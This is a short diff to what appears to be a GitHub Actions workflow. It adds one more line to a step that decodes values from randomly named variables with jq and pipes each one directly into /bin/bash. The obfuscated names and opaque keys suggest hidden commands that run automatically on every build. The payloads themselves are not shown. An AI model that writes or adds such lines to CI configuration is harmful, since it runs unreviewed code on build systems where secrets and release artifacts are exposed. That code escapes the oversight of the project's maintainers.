@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$wzmhw5" | jq -r .b2 | /bin/bash
           echo $w201 | jq -r .of62657 | /bin/bash
           echo $ub611 | jq -r .clsb185 | /bin/bash
+          printf '%s' "$vmnt30" | jq -r .bvhu4862 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
